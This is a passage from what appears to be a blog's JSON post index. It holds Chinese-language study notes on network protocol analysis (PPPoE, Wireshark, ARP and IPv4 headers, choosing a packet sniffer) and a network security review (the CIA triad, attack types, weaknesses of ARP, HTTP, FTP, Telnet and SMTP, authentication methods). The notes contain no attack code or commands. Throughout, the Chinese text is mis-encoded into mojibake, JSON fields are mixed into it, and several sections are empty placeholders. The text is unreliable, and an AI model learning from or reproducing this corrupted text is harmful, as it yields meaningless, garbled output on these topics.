ç»Ÿä»¥å¤ªç½‘ä¸èƒ½æä¾›çš„èº«ä»½éªŒè¯ã€åŠ å¯†ä»¥åŠå‹ç¼©ç­‰åŠŸèƒ½ï¼Œä¹Ÿå¯ç”¨äºç¼†çº¿è°ƒåˆ¶è§£è°ƒå™¨ï¼ˆcable modemï¼‰å’Œæ•°å­—ç”¨æˆ·çº¿è·¯ï¼ˆDSLï¼‰ç­‰ä»¥ä»¥å¤ªç½‘åè®®å‘ç”¨æˆ·æä¾›æ¥å…¥æœåŠ¡çš„åè®®ä½“ç³»ã€‚\nPPPoEåè®®çš„ä½œç”¨æ˜¯ï¼šå®ç°æœ‰æ•ˆçš„ç”¨æˆ·ç®¡ç†ï¼Œè¿›è¡Œç½‘ç»œæ¥å…¥è®¡è´¹ç­‰\n\n#### 27ã€ä»¥å¤ªç½‘å¸§çš„æœ€å¤§ä¼ è¾“å•å…ƒ1500å­—èŠ‚\n\n#### 28ã€ä»€ä¹ˆæ˜¯â€œç½‘ç»œåœ°å›¾â€åŠåœ¨ç½‘ç»œåè®®åˆ†æçš„ä½œç”¨ï¼Ÿ\n\nç½‘ç»œåœ°å›¾ï¼Œåˆç§°ç½‘ç»œæ‹“æ‰‘å›¾ï¼Œæ˜¯æŒ‡ç”¨ä¼ è¾“åª’ä½“äº’è¿å„ç§è®¾å¤‡çš„ç‰©ç†å¸ƒå±€\nç¡®å®šæ•°æ®åŒ…å—…æ¢å™¨çš„å®‰è£…ä½ç½®ï¼Œåœ¨æ•…éšœæ’é™¤å’Œåˆ†æä¸­æœ‰é‡è¦ä½œç”¨\n\n#### 29ã€æ•°æ®åŒ…å—…æ¢è¿‡ç¨‹ä¸­æ¶‰åŠåˆ°è½¯ä»¶å’Œç¡¬ä»¶ä¹‹é—´çš„åä½œã€‚\n\n#### 30ã€åœ¨äº¤æ¢å¼ç½‘ç»œç¯å¢ƒä¸­è¿›è¡Œæ•°æ®åŒ…å—…æ¢çš„æŒ‡å¯¼å‡†åˆ™\n\n![](https://i.loli.net/2019/11/23/3uEBq5GJ8jNLvbe.png)\n![](https://i.loli.net/2019/11/23/UEYGlhLWZnv5e4w.png)\n\n#### 31ã€é€šè¿‡åœ¨Wiresharkçš„Packet Detailsé¢æ¿ä¸­å¯¹æ•è·çš„ARPè¯·æ±‚æ•°æ®åŒ…è¿›è¡Œåˆ†æ\n\n[è®¤è¯†wiresharkçš„ç•Œé¢](https://www.jianshu.com/p/da31d059e526)\n\n#### 32ã€ç½‘ç»œåè®®é€šå¸¸å¯ä»¥ç”¨æ¥è§£å†³å“ªäº›é—®é¢˜ï¼Ÿ\n\n**å‘èµ·è¿æ¥ï¼š**æ˜¯ç”±å®¢æˆ·ç«¯è¿˜æ˜¯æœåŠ¡å™¨å‘èµ·è¿æ¥ï¼Ÿåœ¨çœŸæ­£é€šä¿¡ä¹‹å‰å¿…é¡»è¦äº¤æ¢å“ªäº›ä¿¡æ¯ï¼Ÿ\n**åå•†è¿æ¥å‚æ•°ï¼š**é€šä¿¡éœ€è¦è¿›è¡Œåè®®åŠ å¯†å—ï¼ŸåŠ å¯†å¯†é’¥å¦‚ä½•åœ¨é€šä¿¡åŒæ–¹ä¹‹é—´è¿›è¡Œä¼ è¾“ï¼Ÿ\n**æ•°æ®æ ¼å¼ï¼š**é€šä¿¡æ•°æ®åœ¨æ•°æ®åŒ…ä¸­å¦‚ä½•æ’åˆ—ï¼Ÿæ•°æ®åˆ°è¾¾æ¥æ”¶è®¾å¤‡æ—¶ä»¥ä»€ä¹ˆæ ·çš„é¡ºåºè¿›è¡Œå¤„ç†ï¼Ÿ\n**é”™è¯¯æ£€æµ‹ä¸æ ¡æ­£ï¼š**å½“æ•°æ®åŒ…èŠ±äº†å¤ªé•¿çš„æ—¶é—´æ‰åˆ°è¾¾ç›®çš„åœ°æ—¶å¦‚ä½•å¤„ç†ï¼Ÿå½“å®¢æˆ·ç«¯æš‚æ—¶æ— æ³•å’ŒæœåŠ¡å™¨å»ºç«‹é€šä¿¡æ—¶ï¼Œè¯¥å¦‚ä½•æ¢å¤è¿æ¥ï¼Ÿ\n**è¿æ¥ç»ˆæ­¢ï¼š**ä¸€å°ä¸»æœºå¦‚ä½•å‘ŠçŸ¥å¦ä¸€å°ä¸»æœºé€šä¿¡å·²ç»ç»“æŸï¼Ÿä¸ºäº†ç¤¼è²Œåœ°ç»ˆæ­¢é€šä¿¡ï¼Œåº”è¯¥ä¼ é€ä»€ä¹ˆæ ·çš„æœ€ç»ˆä¿¡æ¯ï¼Ÿ\n\n#### 33ã€ARPåè®®æ ¼å¼é¦–éƒ¨ï¼Œç”¨å›¾è¡¨ç»™å‡ºå„ä¸ªå­—æ®µåç§°å’Œé•¿åº¦ã€‚ \n\n![](https://i.loli.net/2019/11/23/c6BXCtoELrTRMAq.png)\n\n#### 34ã€é€‰æ‹©ä¸€æ¬¾æ•°æ®åŒ…å—…æ¢å™¨æ—¶ï¼Œéœ€è¦è€ƒè™‘å“ªäº›å› ç´ ã€‚å¹¶ç®€è¿°æ¯ä¸ªå› ç´ ã€‚\n\n**æ”¯æŒçš„åè®®ï¼š**æ•°æ®åŒ…å—…æ¢å™¨å¯¹åè®®è§£æçš„æ”¯æŒèŒƒå›´å„ä¸ç›¸åŒï¼Œå¤§éƒ¨åˆ†é€šå¸¸éƒ½èƒ½è§£æå¸¸è§çš„ç½‘ç»œåè®®ï¼ˆå¦‚IPv4å’ŒICMPï¼‰ã€ä¼ è¾“å±‚åè®®ï¼ˆå¦‚TCPå’ŒUDPï¼‰ï¼Œç”šè‡³ä¸€äº›åº”ç”¨å±‚åè®®ï¼ˆå¦‚DNSå’ŒHTTPï¼‰ã€‚ç„¶è€Œï¼Œå®ƒä»¬å¯èƒ½å¹¶ä¸æ”¯æŒä¸€äº›éä¼ ç»Ÿåè®®æˆ–æ–°åè®®ï¼ˆå¦‚IPv6ã€SMBv2ã€SIPç­‰ï¼‰ã€‚åœ¨é€‰æ‹©ä¸€æ¬¾å—…æ¢å™¨æ—¶ï¼Œéœ€è¦ç¡®ä¿å®ƒèƒ½å¤Ÿæ”¯æŒä½ æ‰€è¦ç”¨åˆ°çš„åè®®ã€‚\n**ç”¨æˆ·å‹å¥½æ€§ï¼š**è€ƒè™‘æ•°æ®åŒ…å—…æ¢å™¨çš„ç•Œé¢å¸ƒå±€ã€å®‰è£…çš„å®¹æ˜“åº¦ï¼Œä»¥åŠæ“ä½œæµç¨‹çš„é€šç”¨æ€§ã€‚ä½ é€‰æ‹©çš„å—…æ¢å™¨åº”è¯¥é€‚åˆä½ çš„ä¸“ä¸šçŸ¥è¯†æ°´å¹³ã€‚å¦‚æœä½ çš„æ•°æ®åŒ…åˆ†æç»éªŒè¿˜å¾ˆå°‘çš„è¯ï¼Œä½ å¯èƒ½éœ€è¦é¿å…é€‰æ‹©é‚£äº›å‘½ä»¤è¡Œçš„å—…æ¢å™¨ï¼Œæ¯”å¦‚tcpdumpã€‚å¦ä¸€æ–¹é¢ï¼Œå¦‚æœä½ æ‹¥æœ‰ä¸°å¯Œçš„ç»éªŒï¼Œä½ å¯èƒ½ä¼šè§‰å¾—è¿™ç±»å‘½ä»¤è¡Œç¨‹åºä¼šæ›´å…·æœ‰å¸å¼•åŠ›ã€‚åœ¨ä½ é€æ­¥ç§¯ç´¯æ•°æ®åŒ…åˆ†æç»éªŒæ—¶ï¼Œä½ ç”šè‡³ä¼šå‘ç°ç»„åˆä½¿ç”¨å¤šç§æ•°æ®åŒ…å—…æ¢å™¨è½¯ä»¶å°†æ›´æœ‰åŠ©äºé€‚åº”ç‰¹å®šçš„åº”ç”¨åœºæ™¯ã€‚\n**è´¹ç”¨ï¼š**å…³äºæ•°æ®åŒ…å—…æ¢å™¨æœ€ä¼Ÿå¤§çš„äº‹æƒ…æ˜¯æœ‰ç€å¾ˆå¤šèƒ½å¤Ÿä¸ä»»ä½•å•†ä¸šäº§å“ç›¸åª²ç¾çš„å…è´¹å·¥å…·ã€‚å•†ä¸šäº§å“ä¸å…¶ä»–æ›¿ä»£å“ä¹‹é—´æœ€æ˜¾è‘—çš„åŒºåˆ«æ˜¯å®ƒä»¬çš„æŠ¥å‘Šå¼•æ“ï¼Œå•†ä¸šäº§å“é€šå¸¸åŒ…æ‹¬å„ç§èŠ±å“¨çš„æŠ¥å‘Šç”Ÿæˆæ¨¡å—ï¼Œè€Œåœ¨å…è´¹è½¯ä»¶ä¸­åˆ™é€šå¸¸ç¼ºä¹ï¼Œç”šè‡³æ²¡æœ‰è¯¥æ¨¡å—ã€‚\n**æŠ€æœ¯æ”¯æŒï¼š**å³ä½¿ä½ å·²ç»æŒæ¡äº†å—…æ¢è½¯ä»¶çš„åŸºæœ¬ç”¨æ³•ï¼Œä½†æ˜¯ä½ è¿˜æ˜¯å¶å°”ä¼šåœ¨é‡åˆ°ä¸€äº›æ–°é—®é¢˜æ—¶éœ€è¦æŠ€æœ¯æ”¯æŒã€‚åœ¨è¯„ä¼°æŠ€æœ¯æ”¯æŒæ—¶ï¼Œä½ å¯ä»¥å¯»æ‰¾å¼€å‘äººå‘˜æ–‡æ¡£ã€å…¬ä¼—è®ºå›å’Œé‚®ä»¶åˆ—è¡¨ã€‚è™½ç„¶å¯¹äºä¸€äº›åƒWiresharkè¿™æ ·çš„å…è´¹è½¯ä»¶å¯èƒ½ç¼ºä¹ä¸€äº›å¼€å‘äººå‘˜æ–‡æ¡£ï¼Œä½†ä½¿ç”¨è¿™äº›åº”ç”¨è½¯ä»¶çš„ç¤¾åŒºå¾€å¾€å¯ä»¥å¡«è¡¥è¿™äº›ç©ºç™½ã€‚ä½¿ç”¨è€…å’Œè´¡çŒ®è€…ç¤¾åŒºä¼šæä¾›ä¸€äº›è®¨è®ºåŒºã€ç»´åŸºã€åšå®¢ï¼Œæ¥å¸®åŠ©ä½ è·å¾—æ›´å¤šå…³äºæ•°æ®åŒ…å—…æ¢å™¨çš„ä½¿ç”¨æ–¹æ³•ã€‚\n**æ“ä½œç³»ç»Ÿæ”¯æŒï¼š**é—æ†¾çš„æ˜¯ï¼Œå¹¶ä¸æ˜¯æ‰€æœ‰çš„æ•°æ®åŒ…å—…æ¢å™¨éƒ½æ”¯æŒæ‰€æœ‰çš„æ“ä½œç³»ç»Ÿå¹³å°ã€‚ä½ éœ€è¦é€‰æ‹©ä¸€æ¬¾å—…æ¢å™¨ï¼Œèƒ½å¤Ÿæ”¯æŒæ‰€æœ‰ä½ å°†è¦ä½¿ç”¨çš„æ“ä½œç³»ç»Ÿã€‚å¦‚æœä½ æ˜¯ä¸€ä½é¡¾é—®ï¼Œä½ å¯èƒ½éœ€è¦åœ¨å¤§å¤šæ•°æ“ä½œç³»ç»Ÿå¹³å°ä¸Šè¿›è¡Œæ•°æ®åŒ…æ•è·å’Œåˆ†æï¼Œé‚£ä¹ˆä½ å°±éœ€è¦ä¸€æ¬¾èƒ½å¤Ÿåœ¨å¤§å¤šæ•°æ“ä½œç³»ç»Ÿå¹³å°ä¸Šè¿è¡Œçš„å—…æ¢å™¨ã€‚ä½ è¿˜éœ€è¦ç•™æ„ï¼Œä½ æœ‰æ—¶ä¼šåœ¨ä¸€å°æœºå™¨ä¸Šæ•è·æ•°æ®åŒ…ï¼Œç„¶ååœ¨å¦ä¸€å°æœºå™¨ä¸Šåˆ†æå®ƒä»¬ã€‚æ“ä½œç³»ç»Ÿä¹‹é—´çš„å·®å¼‚ï¼Œå¯èƒ½ä¼šè¿«ä½¿ä½ åœ¨ä¸åŒçš„è®¾å¤‡ä¸Šä½¿ç”¨ä¸åŒçš„å—…æ¢å™¨è½¯ä»¶ã€‚\n\n#### 35ã€é€šè¿‡åœ¨Wiresharkçš„Packet Detailsé¢æ¿ä¸­å¯¹æ•è·çš„IPåè®®å¤´æ•°æ®åŒ…è¿›è¡Œåˆ†æ\n\n#### 36ã€ç»˜åˆ¶IPv4æ•°æ®æŠ¥é¦–éƒ¨ï¼Œç»™å‡ºå„ä¸ªå­—æ®µåç§°å’Œé•¿åº¦ã€‚ \n\n![](https://i.loli.net/2019/11/23/qBR29QlCYImLVZw.png)\n\nä¸€ã€é€‰æ‹©é¢˜ï¼ˆ30å°é¢˜ï¼Œæ€»è®¡30åˆ†ï¼‰        äºŒã€å¡«ç©ºé¢˜15åˆ†   \nä¸‰ã€é—®ç­”é¢˜ï¼ˆ5å°é¢˜å…±40åˆ†ï¼‰             å››ã€åˆ†æé¢˜15åˆ†\n\nå‚è€ƒï¼š\n[è®¡ç®—æœºç½‘ç»œ(ç¬¬7ç‰ˆ)è¯»ä¹¦ç¬”è®°](https://www.smi1e.top/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC7%E7%89%88%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/)\n[è®¡ç®—æœºç½‘ç»œåŠ Wireshark å­¦ä¹ ç¬”è®°](https://kyangc.com/2015/07/20/wireshark-learning-note/)\n\n\n\n","tags":["ç½‘ç»œåè®®åˆ†æ"],"categories":["CSåŸºç¡€"]},{"title":"ç½‘ç»œå®‰å…¨æŠ€æœ¯å¤ä¹ ","url":"/posts/51545.html","content":"## ä¸€ã€ç»ªè®º\n\n### ç½‘ç»œå®‰å…¨çš„åŸºæœ¬æ¦‚å¿µ\n#### å®šä¹‰ï¼š\n\nç½‘ç»œç³»ç»Ÿçš„`è½¯ä»¶`ã€`ç¡¬ä»¶`ä»¥åŠç³»ç»Ÿä¸­å­˜å‚¨å’Œä¼ è¾“çš„`æ•°æ®`å—åˆ°ä¿æŠ¤ï¼Œä¸å› å¶ç„¶çš„æˆ–è€…æ¶æ„çš„åŸå› è€Œé­åˆ°ç ´åã€æ›´æ”¹ã€æ³„éœ²ï¼Œç½‘ç»œç³»ç»Ÿè¿ç»­å¯é æ­£å¸¸åœ°è¿è¡Œï¼Œç½‘ç»œæœåŠ¡ä¸ä¸­æ–­ã€‚\n#### å±æ€§:\n**æœºå¯†æ€§**ï¼šä¿è¯ä¿¡æ¯ä¸ä¿¡æ¯ç³»ç»Ÿä¸è¢«éæˆæƒçš„ç”¨æˆ·ã€å®ä½“æˆ–è¿‡ç¨‹æ‰€è·å–ä¸ä½¿ç”¨\n**å®Œæ•´æ€§**ï¼šä¿¡æ¯åœ¨å­˜è´®æˆ–ä¼ è¾“æ—¶ä¸è¢«ä¿®æ”¹ã€ç ´åï¼Œæˆ–ä¸å‘ç”Ÿä¿¡æ¯åŒ…ä¸¢å¤±ã€ä¹±åºç­‰\n**å¯ç”¨æ€§**ï¼šä¿¡æ¯ä¸ä¿¡æ¯ç³»ç»Ÿå¯è¢«æˆæƒå®ä½“æ­£å¸¸è®¿é—®çš„ç‰¹æ€§ï¼Œå³æˆæƒå®ä½“å½“éœ€è¦æ—¶èƒ½å¤Ÿå­˜å–æ‰€éœ€ä¿¡æ¯ \n**å¯æ§æ€§**ï¼šå¯¹ä¿¡æ¯çš„å­˜å‚¨äºä¼ æ’­å…·æœ‰å®Œå…¨çš„æ§åˆ¶èƒ½åŠ›ï¼Œå¯ä»¥æ§åˆ¶ä¿¡æ¯çš„æµå‘å’Œè¡Œä¸ºæ–¹å¼\n**çœŸå®æ€§**ï¼šä¹Ÿå°±æ˜¯å¯é æ€§ï¼ŒæŒ‡ä¿¡æ¯çš„å¯ç”¨åº¦ï¼ŒåŒ…æ‹¬ä¿¡æ¯çš„å®Œæ•´æ€§ã€å‡†ç¡®æ€§å’Œå‘é€äººçš„èº«ä»½è¯å®ç­‰æ–¹é¢ï¼Œå®ƒä¹Ÿæ˜¯ä¿¡æ¯å®‰å…¨æ€§çš„åŸºæœ¬è¦ç´ \n\nå…¶ä¸­ï¼Œ`æœºå¯†æ€§ã€å®Œæ•´æ€§å’Œå¯ç”¨æ€§`é€šå¸¸è¢«è®¤ä¸ºæ˜¯ç½‘ç»œå®‰å…¨çš„ä¸‰ä¸ªåŸºæœ¬å±æ€§ï¼ˆCIAä¸‰è¦ç´ ï¼‰\n#### æ¨¡å‹:\n![](https://i.loli.net/2019/11/05/nSqjy1iIPTWvroc.png)\n\n![](https://i.loli.net/2019/11/05/l1co4V6hsRPzkir.png)\n#### æ”»å‡»æ‰‹æ®µ:\n**è¢«åŠ¨æ”»å‡»**:è¯•å›¾æ”¶é›†ã€åˆ©ç”¨ç³»ç»Ÿçš„ä¿¡æ¯ä½†ä¸å½±å“ç³»ç»Ÿçš„æ­£å¸¸è®¿é—®ï¼Œæ•°æ®çš„åˆæ³•ç”¨æˆ·å¯¹è¿™ç§æ´»åŠ¨ä¸€èˆ¬ä¸ä¼šè§‰å¯Ÿåˆ°ã€‚\nè¢«åŠ¨æ”»å‡»æ–¹å¼ï¼šä¿¡æ¯æ”¶é›†å’Œæµé‡åˆ†æ\n**ä¸»åŠ¨æ”»å‡»**:æ”»å‡»è€…è®¿é—®ä»–æ‰€éœ€ä¿¡æ¯çš„æ•…æ„è¡Œä¸ºï¼Œä¸€èˆ¬ä¼šæ”¹å˜ç³»ç»Ÿèµ„æºæˆ–å½±å“ç³»ç»Ÿè¿ä½œã€‚ \nä¸»åŠ¨æ”»å‡»æ–¹å¼ï¼šåŒ…æ‹¬å¯¹æ•°æ®æµè¿›è¡Œç¯¡æ”¹æˆ–ä¼ªé€ æ•°æ®æµï¼Œå¯åˆ†ä¸ºå››ç±»ï¼šä¼ªè£…ã€é‡æ”¾ã€æ¶ˆæ¯ç¯¡æ”¹å’Œæ‹’ç»æœåŠ¡ã€‚\n#### å®‰å…¨æœåŠ¡ï¼š\nOSIå®‰å…¨ä½“ç³»ç»“æ„å°†å®‰å…¨æœåŠ¡å®šä¹‰ä¸ºé€šä¿¡å¼€æ”¾ç³»ç»Ÿåè®®å±‚æä¾›çš„æœåŠ¡ï¼Œä»è€Œä¿è¯ç³»ç»Ÿæˆ–æ•°æ®ä¼ è¾“æœ‰è¶³å¤Ÿçš„å®‰å…¨æ€§\nOSIå®‰å…¨ä½“ç³»ç»“æ„å®šä¹‰äº†5å¤§ç±»å…±14ä¸ªå®‰å…¨æœåŠ¡\n![](https://i.loli.net/2019/11/12/riRDczWeldkFtIo.png)\n#### å®‰å…¨æœºåˆ¶ï¼š\n![](https://i.loli.net/2019/11/12/n9bDwCr84jRpXu7.png)\n### é€ æˆInternetå®‰å…¨é—®é¢˜çš„ä¸»è¦åŸå› \n1.ä¿¡æ¯äº¤æ¢å’Œå…±äº«æ—¥ç›Šä¾èµ–äºInternet\n2.åŸºäºTCP/IPåè®®ï¼Œè‡ªèº«ç¼ºä¹å®‰å…¨ç­–ç•¥\nÂ· ä¿¡æ¯ä¼ è¾“æœªåŠ å¯†\nÂ· å¼€æ”¾æ€§ï¼šåè®®çš„ä½“ç³»å’Œå®ç°æ˜¯å…¬å¼€çš„\n3.å¤§é‡è®¾è®¡ç¼ºé™·å’Œå®‰å…¨æ¼æ´\n4.IPåè®®æ ˆå„å±‚éƒ½æœ‰å®‰å…¨é—®é¢˜\n5.å¤–æ¥æ”»å‡»è€…\n### ç½‘ç»œå®‰å…¨å½¢åŠ¿ä¸¥å³»çš„åŸå› \n1.ä¸­å›½äº’è”ç½‘æŒç»­å¿«é€Ÿå‘å±•ï¼Œè€Œæˆ‘å›½ç½‘ç»œå®‰å…¨åŸºç¡€è®¾æ–½å»ºè®¾è·Ÿä¸ä¸Šäº’è”ç½‘å‘å±•çš„æ­¥ä¼ï¼Œæ°‘ä¼—çš„ç½‘ç»œå®‰å…¨æ„è¯†è–„å¼±\n2.æŠ€æœ¯çš„ä¸æ–­æé«˜ï¼Œæ”»å‡»å·¥å…·æ—¥ç›Šä¸“ä¸šåŒ–ã€æ˜“ç”¨åŒ–ï¼Œæ”»å‡»æ–¹æ³•ä¹Ÿè¶Šæ¥è¶Šå¤æ‚ã€éšè”½ï¼Œé˜²æŠ¤éš¾åº¦è¾ƒå¤§\n3.ç”µå­å•†åŠ¡é¢†åŸŸä¸æ–­æ‰©å±•ï¼Œä¸ç°å®ä¸­çš„é‡‘èä½“ç³»æ—¥ç›Šèåˆï¼Œä¸ºç½‘ç»œä¸–ç•Œçš„è™šæ‹Ÿè¦ç´ é™„åŠ äº†å®é™…ä»·å€¼ï¼Œè¿™äº›ä¿¡æ¯ç³»ç»Ÿæˆä¸ºé»‘å®¢æ”»å‡»ç‰Ÿåˆ©çš„ç›®æ ‡\n## äºŒã€ç½‘ç»œåè®®åŸºç¡€\n### ç½‘ç»œä½“ç³»ç»“æ„å„å±‚çš„åŠŸèƒ½\n**ç‰©ç†å±‚**ï¼šè€ƒè™‘ç”¨å¤šå¤§çš„ç”µå‹ä»£è¡¨æ‰€ä¼ è¾“çš„æ¯”ç‰¹ï¼Œä»¥åŠæ¥æ”¶æ–¹å¦‚ä½•è¯†åˆ«å‡ºè¿™äº›æ¯”ç‰¹\n**æ•°æ®é“¾è·¯å±‚**ï¼šåŒ…æ‹¬æ“ä½œç³»ç»Ÿä¸­çš„è®¾å¤‡é©±åŠ¨ç¨‹åºå’Œè®¡ç®—æœºä¸­å¯¹åº”çš„ç½‘ç»œæ¥å£å¡ï¼Œè´Ÿè´£å¤„ç†ä¸ä¼ è¾“ç”µç¼†çš„ç‰©ç†æ¥å£ç»†èŠ‚\n**ç½‘ç»œå±‚**ï¼šè´Ÿè´£å¤„ç†åˆ†ç»„åœ¨ç½‘ç»œä¸­çš„æ´»åŠ¨ï¼Œä¾‹å¦‚åˆ†ç»„çš„é€‰è·¯\n**ä¼ è¾“å±‚**ï¼šè´Ÿè´£å‘ä¸¤ä¸ªä¸»æœºä¸­è¿›ç¨‹ä¹‹é—´çš„é€šä¿¡æä¾›é€šç”¨çš„æ•°æ®ä¼ è¾“æœåŠ¡\n**åº”ç”¨å±‚**ï¼šå®šä¹‰åº”ç”¨è¿›ç¨‹é—´é€šä¿¡å’Œäº¤äº’çš„è§„åˆ™,è´Ÿè´£é€šè¿‡åº”ç”¨è¿›ç¨‹é—´çš„äº¤äº’æ¥å®Œæˆç‰¹å®šç½‘ç»œåº”ç”¨ã€‚åº”ç”¨å±‚çš„åè®®æœ‰æ”¯æŒä¸‡ç»´ç½‘åº”ç”¨çš„HTTPåè®®ï¼Œæ”¯æŒç”µå­é‚®ä»¶çš„SMTPåè®®ç­‰\n### TCP/IPåè®®æ—ä¸­ä¸€äº›åè®®çš„å®‰å…¨é—®é¢˜\n#### ARP\nARPåè®®ï¼šåˆ©ç”¨ARPç¼“å­˜è¡¨è®°å½•IPåœ°å€ä¸MACåœ°å€çš„å¯¹åº”å…³ç³»ï¼Œå¦‚æœæ²¡æœ‰æ­¤é¡¹è®°å½•ï¼Œåˆ™é€šè¿‡ARPå¹¿æ’­è·å¾—ç›®çš„ä¸»æœºçš„MACåœ°å€\n![](https://ftp.bmp.ovh/imgs/2019/11/60fef59f64ac6ef3.png)\nARPæ”»å‡»å°±æ˜¯é€šè¿‡ä¼ªé€ IPåœ°å€å’ŒMACåœ°å€å®ç°ARPæ¬ºéª—ï¼Œèƒ½å¤Ÿåœ¨ç½‘ç»œä¸­äº§ç”Ÿå¤§é‡çš„ARPé€šä¿¡é‡ä½¿ç½‘ç»œé˜»å¡ï¼Œæ”»å‡»è€…åªè¦æŒç»­ä¸æ–­çš„å‘å‡ºä¼ªé€ çš„ARPå“åº”åŒ…å°±èƒ½æ›´æ”¹ç›®æ ‡ä¸»æœºARPç¼“å­˜ä¸­çš„IP-MACæ¡ç›®ï¼Œé€ æˆç½‘ç»œä¸­æ–­æˆ–ä¸­é—´äººæ”»å‡»ã€‚\n**åˆ†ç±»ï¼š**\né’ˆå¯¹ä¸»æœºçš„ARPæ¬ºéª—ï¼šå†’å……å…¶å®ƒä¸»æœºï¼Œæ¥æ”¶è¯¥ä¸»æœºçš„ä¿¡æ¯\né’ˆå¯¹äº¤æ¢æœºçš„ARPæ¬ºéª—ï¼šåˆ©ç”¨å·¥å…·äº§ç”Ÿæ¬ºéª—MACï¼Œå¹¶å¿«é€Ÿå¡«æ»¡äº¤æ¢æœºçš„MACåœ°å€è¡¨\n#### TCP\nã€‚ã€‚ã€‚ã€‚ã€‚\n#### HTTP\n**HTTP çš„ä¸»è¦ç‰¹ç‚¹**ï¼šHTTP åè®®æœ¬èº«ä¹Ÿæ˜¯`æ— è¿æ¥çš„`ï¼Œè™½ç„¶å®ƒä½¿ç”¨äº†é¢å‘è¿æ¥çš„ TCP å‘ä¸Šæä¾›çš„æœåŠ¡ã€‚\n HTTP 1.0 åè®®æ˜¯æ— çŠ¶æ€çš„(stateless)ã€‚\n**æ— çŠ¶æ€**ï¼š HTTPæ— æ³•è®°ä½åŒä¸€ç”¨æˆ·è¿ç»­ä¸¤æ¬¡ç›¸åŒçš„è¿æ¥\nä½¿ç”¨Cookieæ¥è§£å†³HTTPçš„æ— çŠ¶æ€æ€§\nå¸¦æ¥çš„æ–°é—®é¢˜ï¼šè·å–ç”¨æˆ·çš„ä¸ªäººéšç§\n#### FTP\nå¤šæ•°FTPæœåŠ¡å™¨å¯ä»¥ç”¨anonymous ç”¨æˆ·åç™»å½•ï¼Œè¿™æ ·å­˜åœ¨è®©ç”¨æˆ·ç ´åç³»ç»Ÿå’Œæ–‡ä»¶çš„å¯èƒ½ï¼›\nç®€å•æ–‡ä»¶ä¼ è¾“åè®®æ”¯æŒæ— è®¤è¯æ“ä½œã€‚\n#### TELNET\ntelnetè¾“å…¥çš„è´¦æˆ·å’Œå¯†ç æ˜¯æ˜æ–‡ä¼ è¾“çš„ï¼Œå®¹æ˜“è¢«ç›‘å¬åˆ°\n#### SMTP\n1.ç”µå­é‚®ä»¶ä¸Šçš„åœ°å€å¯ä»¥æ˜¯å‡å†’çš„ï¼Œè§’è‰²æ¬ºéª—ï¼›\n2.ç”µå­é‚®ä»¶çš„å†…å®¹æ˜¯æ˜æ–‡ä¼ è¾“çš„ï¼Œå¯èƒ½è¢«å·çœ‹ï¼›\n3.ç”µå­é‚®ä»¶ç‚¸å¼¹ï¼Œè®¡ç®—æœºè¢«ç”µå­é‚®ä»¶æ‰€æ·¹æ²¡è‡³ä¸»æœºå´©æºƒï¼›\n4.é’ˆå¯¹ç”µå­é‚®ä»¶çš„ç—…æ¯’\n#### ICMP\nå¯¹ICMPåè®®çš„åˆ©ç”¨ï¼šping, traceroot\n**pingå‘½ä»¤ï¼š**ä¸å…‰èƒ½éªŒè¯ç½‘ç»œçš„è¿é€šæ€§ï¼ŒåŒæ—¶ä¹Ÿä¼šç»Ÿè®¡å“åº”æ—¶é—´å’ŒåŒ…çš„ç”Ÿå­˜å‘¨æœŸï¼ˆTTLï¼‰ \n**tracerouteå‘½ä»¤ï¼š**èƒ½å¤Ÿæ‰“å°å‡ºå¯æ‰§è¡Œç¨‹åºä¸»æœºä¸€ç›´åˆ°ç›®æ ‡ä¸»æœºä¹‹å‰ç»å†å¤šå°‘è·¯ç”±å™¨ã€‚\n## ä¸‰ã€å¯†ç å­¦åœ¨ç½‘ç»œå®‰å…¨ä¸­çš„åº”ç”¨\n### å¯¹ç§°å¯†ç ä½“åˆ¶/éå¯¹ç§°å¯†ç ä½“åˆ¶\n### æ··åˆåŠ å¯†ä½“åˆ¶\n### æ•°å­—ç­¾å\n### å¯†é’¥ç®¡ç†\n## å››ã€æ¶ˆæ¯é‰´åˆ«\næ¶ˆæ¯é‰´åˆ«åè®®çš„æ ¸å¿ƒâ€”â€”é‰´åˆ«å‡½æ•°\n### å¦‚ä½•åˆ©ç”¨é‰´åˆ«å‡½æ•°æ„é€ é‰´åˆ«åè®®\nã€‚ã€‚ã€‚ã€‚ã€‚ã€‚\n### åˆ†æä¸€ä¸ªé‰´åˆ«åè®®çš„å®‰å…¨é—®é¢˜*\nã€‚ã€‚ã€‚ã€‚ã€‚ã€‚\n## äº”ã€èº«ä»½è®¤è¯\nè®¤è¯åˆ†ä¸ºèº«ä»½è®¤è¯å’Œæ¶ˆæ¯è®¤è¯\n### èº«ä»½è®¤è¯åˆ†ç±»ï¼š\n1.è®¡ç®—æœºè®¤è¯äººçš„èº«ä»½\n2.è®¡ç®—æœºè®¤è¯è®¡ç®—æœº\n### èº«ä»½è®¤è¯çš„æ¦‚å¿µ\næ˜¯è®¡ç®—æœºåŠç½‘ç»œç³»ç»Ÿè¯†åˆ«æ“ä½œè€…èº«ä»½çš„è¿‡ç¨‹\n### æœ‰å“ªäº›å¸¸ç”¨çš„èº«ä»½è®¤è¯æ–¹å¼ï¼Œåˆ†æå…¶ä¼˜ç¼ºç‚¹\nç”¨æˆ·å/å£ä»¤æ–¹å¼\nICå¡è®¤è¯\nç”Ÿç‰©ç‰¹å¾è®¤è¯\nUSB Keyè®¤è¯\nåŠ¨æ€å£ä»¤/åŠ¨æ€å¯†ç \næ•°å­—ç­¾å\n![](https://i.loli.net/2019/11/12/8y9DP1jQudLr57N.png)\n**å£ä»¤å­˜å‚¨ï¼š**\né€šå¸¸ç»è¿‡åŠ å¯†åå­˜å‚¨åœ¨è®¡ç®—æœºä¸­\n**å£ä»¤ä¼ è¾“ï¼š**\nä¸€èˆ¬é‡‡ç”¨åŒæ–¹åå•†å¥½çš„åŠ å¯†ç®—æ³•æˆ–å•å‘æ•£åˆ—å‡½æ•°å¯¹å£ä»¤è¿›è¡Œå¤„ç†åä¼ è¾“\n### åŸºäºæŒ‘æˆ˜åº”ç­”/KDCæ–¹å¼çš„è®¤è¯çš„ä½œç”¨\næé«˜äº†ç”¨æˆ·èº«ä»½è®¤è¯çš„å®‰å…¨æ€§ï¼Œå¯ä»¥æŠµæŠ—é‡æ”¾æ”»å‡»\n### 